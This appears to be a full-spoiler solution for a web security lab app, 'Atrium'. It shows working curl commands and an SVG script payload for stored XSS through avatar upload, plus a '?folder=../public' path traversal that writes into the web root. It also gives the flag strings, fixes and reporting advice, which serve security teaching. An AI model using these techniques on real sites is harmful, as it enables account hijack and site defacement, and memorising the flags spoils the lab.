# Solution — Atrium

Full spoilers.

```bash
curl -s -c jar -X POST http://localhost:8091/api/session \
  -H 'Content-Type: application/json' \
  -d '{"email":"n.aaberg@atrium.example","password":"Atrium-Directory-2026"}'
```

## Establishing what the filter actually does

```bash
curl -s -b jar -F "avatar=@shell.php" http://localhost:8091/api/avatar
# {"error":"only .png, .jpg, .jpeg, .gif, .webp, .svg are accepted"}
```

An allow-list, not a denylist — so the usual double-extension and
null-byte tricks (`shell.php.png`, `shell.php%00.png`) have nothing to
work with: `path.extname()` returns the last extension and it must be in
the list. The name is also reduced to a leaf before use, so a path in the
`filename=` field of the multipart part goes nowhere.

Three real controls. Read the list again and ask which of those six
formats is not a bitmap.

## Objective 1 — `HxBugLabs{n0t_3v3ry_1m4g3_f0rm4t_1s_1n3rt}`

### The bug

**SVG is XML, and XML can carry script.** It is on the allow-list because
it is an image format; it behaves like a document.

```bash
cat > avatar.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120">
  <circle cx="60" cy="60" r="55" fill="#3b5bdb"/>
  <script>
    fetch('/api/staff').then(r => r.json()).then(d => { document.title = d.staff.length + ' staff'; });
  </script>
</svg>
SVG

curl -s -b jar -F "avatar=@avatar.svg" http://localhost:8091/api/avatar
# {"ok":true,"storedAs":"avatar.svg","servedAt":"/uploads/avatar.svg", ...}
```

Then look at how it comes back:

```bash
curl -si http://localhost:8091/uploads/avatar.svg | grep -i content-type
# Content-Type: image/svg+xml
```

`image/svg+xml`, from the application's own origin, with no
`Content-Disposition: attachment` and no `Content-Security-Policy`. Open
`http://localhost:8091/uploads/avatar.svg` as a top-level page and the
script runs — in Atrium's origin, with Atrium's cookies.

The audit endpoint confirms the condition:

```bash
curl -s http://localhost:8091/api/uploads/audit | python3 -m json.tool
```

```json
"activeContentHosted": {
  "files": ["/uploads/avatar.svg"],
  "note": "served from the application origin with an executable content type",
  "flag": "HxBugLabs{n0t_3v3ry_1m4g3_f0rm4t_1s_1n3rt}"
}
```

### Why the `<img>` tag confuses people

An SVG referenced by `<img src="…">` runs no script — browsers load it in
a restricted mode. That is why this bug survives testing: the directory
page renders avatars in `<img>` tags and behaves perfectly.

The attack does not use an `<img>` tag. It sends the victim the direct
URL, which the application happily hosts. Same origin, full script
execution, session cookies attached.

### Root cause

Two decisions that are only dangerous together:

1. **An allow-list of formats that includes an active one.** SVG is the
   usual offender; HTML disguised as `.xhtml`, and XML that a viewer
   renders, are the others.
2. **User-uploaded files served from the application's own origin.**
   That is what makes it stored XSS rather than a file on a CDN nobody
   trusts.

Any one of these fixes it:

- **Serve uploads from a separate origin** (`usercontent-atrium.example`,
  or a bucket with its own domain). Then a script in an upload runs in an
  origin holding nothing.
- **Force download**: `Content-Disposition: attachment` plus
  `X-Content-Type-Options: nosniff` on everything under `/uploads/`.
- **Re-encode every image server-side.** Decode and re-emit as PNG/JPEG;
  an SVG that survives that is a PNG.
- **Sanitize SVG** with a real sanitizer if you must keep the format —
  and know that SVG sanitizers have a long CVE history.
- **A restrictive CSP** on the upload path (`default-src 'none'`) as
  defence in depth.

## Objective 2 — `HxBugLabs{4_f1l3n4m3_1s_4_p4th_unt1l_y0u_str1p_1t}`

### The bug

The upload response tells you where the file went:

```json
{"storedAs":"avatar.svg","storedIn":"/app/uploads","servedAt":"/uploads/avatar.svg"}
```

`storedIn` is a directory the request can change. Avatars are filed per
team:

```js
destination: (req, file, cb) => {
  const folder = String(req.query.folder || "").trim();
  const target = folder ? path.join(UPLOAD_DIR, folder) : UPLOAD_DIR;
  fs.mkdirSync(target, { recursive: true });
  cb(null, target);
}
```

The **name** was carefully reduced to a leaf. The **folder** is joined
straight on. `path.join` resolves `..` — that is its job — so a folder of
`../public` lands outside the upload directory entirely.

### Exploiting it

```bash
curl -s -b jar -F "avatar=@avatar.svg" \
  "http://localhost:8091/api/avatar?folder=../public"
```

```json
{"storedAs":"avatar.svg","storedIn":"/app/public","servedAt":"/uploads/../public/avatar.svg"}
```

`/app/public` is the web root. The file is now served from the root of
the site:

```bash
curl -si http://localhost:8091/avatar.svg | head -1
# HTTP/1.1 200 OK
```

```json
"escapedUploadDirectory": {
  "files": ["avatar.svg"],
  "note": "written outside the upload directory",
  "flag": "HxBugLabs{4_f1l3n4m3_1s_4_p4th_unt1l_y0u_str1p_1t}"
}
```

Uploading `index.html` to the same folder replaces the site's front page.
Deeper paths reach anywhere the process can write — `../` repeated walks
up out of `/app` entirely.

### Root cause

**Half the path was sanitized.** Somebody thought about traversal, fixed
the field where traversal is famous (`filename`), and joined the other
half of the path without normalising it.

The correct shape:

```js
const folder = String(req.query.folder || "");
const target = path.resolve(UPLOAD_DIR, folder);
if (target !== UPLOAD_DIR && !target.startsWith(UPLOAD_DIR + path.sep)) {
  return cb(new Error("invalid folder"));
}
```

`path.resolve` first, then confirm the result is still inside the base —
never check the input string for `..`, because `%2e%2e`, `....//`,
overlong UTF-8 and `..\` on Windows all defeat that. Better still: do not
take the folder from the client at all. The uploader's team is already
known from their session.

The general rule: **every path segment that comes from a request is
attacker-controlled, not just the one called `filename`.** Query
parameters, JSON fields, headers, and the parts of a multipart body are
all the same input.

## Notes for the report

Two findings, related but separately fixable, and the second is worse
than it first sounds.

- **Objective 1 — stored XSS via SVG upload served from the application
  origin.** High. Show the `Content-Type: image/svg+xml` response header
  and the script executing on a top-level navigation. Pre-empt the "SVGs
  in `<img>` cannot run script" reply by stating in the report that the
  attack uses a direct link, not the directory page.
- **Objective 2 — arbitrary file write outside the upload directory via
  the `folder` parameter.** Critical. Do not stop at "I wrote a file
  somewhere odd" — say what the write reaches. Replacing `index.html`
  defaces the site; on a deployment that serves anything executable from
  disk, an arbitrary write is remote code execution, and the report
  should say which of those applies here and why.

On a real target, write one harmless file with a random name, screenshot
it being served, and delete nothing you did not create. Arbitrary file
write is the one finding class where an enthusiastic proof of concept can
do real damage.
